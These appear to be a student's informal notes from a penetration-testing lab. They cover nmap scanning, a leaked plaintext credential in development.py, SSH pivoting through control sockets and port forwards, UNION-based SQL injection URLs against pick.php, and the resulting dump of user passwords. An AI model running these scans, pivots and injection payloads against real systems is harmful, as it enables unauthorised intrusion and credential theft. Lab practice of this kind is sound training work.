ignore .190 
ignore 10.10.x.x
there are 5 boxes but ignore the .190
get root or admin on 2 of the boxes
.ssh/known host file 
HAST : 10.50.90.39.220

`student@lin-ops:~$ nmap -T4 -Pn -sV 10.50.39.220`
`student@lin-ops:~$ nmap --script http-enum 10.50.39.220`
see running ssh(22) and http(80)
go on web @ ip using firefox
run http enum script see different web pages
find development.py with:
```
#!/usr/bin/python3
import os
system_user=user2
user_password=EaglesIsARE78
##Developer note
#script will eventually take above system user credentials and run automated services
```
found:
"Notice: Undefined index: username in /var/www/html/login.php on line 43
Notice: Undefined index: passwd in /var/www/html/login.php on line 44
Try Again"
use creds to log in using ssh
`student@lin-ops:~$ ssh user2@10.50.39.220`
situational awareness


made MS socket
`student@lin-ops:~$ ssh -MS /tmp/red user2@10.50.39.220`

somehow found ip for new box to go to
$ cat /etc/hosts.allow
192.168.28.181 is the BestWebApp
`student@lin-ops:~$ ssh -S /tmp/red red -O forward -D9050`
`student@lin-ops:~$ ssh -S /tmp/red red -O forward -L 1601:192.168.28.181:80`
`http://0.0.0.0:1601/pick.php?product=7%20UNION%20SELECT%20table_schema,column_name,table_name%20FROM%20information_schema.columns`
`http://0.0.0.0:1601/pick.php?product=7%20UNION%20SELECT%20user_id,name,username%20FROM%20siteusers.users`
found passwords, encoded in rot13
Aaron - apasswordyPa$$word
user2 - EaglesIsARE78
user3 - Bob4THEEapples
Lroth - anotherpassword4THEages



